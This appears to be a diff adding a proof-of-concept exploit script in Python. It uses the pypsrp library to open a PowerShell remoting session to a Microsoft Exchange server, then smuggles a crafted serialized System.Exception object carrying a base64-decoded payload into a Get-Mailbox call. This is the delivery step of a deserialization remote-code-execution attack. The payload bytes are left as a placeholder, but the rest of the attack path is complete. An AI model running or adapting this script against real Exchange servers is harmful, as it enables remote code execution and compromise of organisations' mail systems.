@@ -1,0 +1,21 @@
+from pypsrp.powershell import PowerShell, RunspacePool
+from pypsrp.wsman import WSMan
+from pypsrp.complex_objects import ComplexObject, ObjectMeta
+import base64
+
+
+class ExceptionObject(ComplexObject):
+    def __init__(self, SerializationData):
+        super(ExceptionObject, self).__init__()
+        self._adapted_properties = (
+            ('SerializationData', ObjectMeta('BA', name='SerializationData')),
+        )
+        self._types = ['System.Exception', 'System.Object']
+        self.SerializationData = SerializationData
+
+
+wsman = WSMan(server='netbios', username='username', password='password',path='powershell', ssl=False, port=80, auth='kerberos', scheme='http',)
+with RunspacePool(wsman, configuration_name='Microsoft.Exchange') as pool:
+    ps = PowerShell(pool)
+    payload = base64.b64decode('payload here')
+    ps.add_cmdlet('Get-Mailbox').add_argument(ExceptionObject(payload)).invoke()
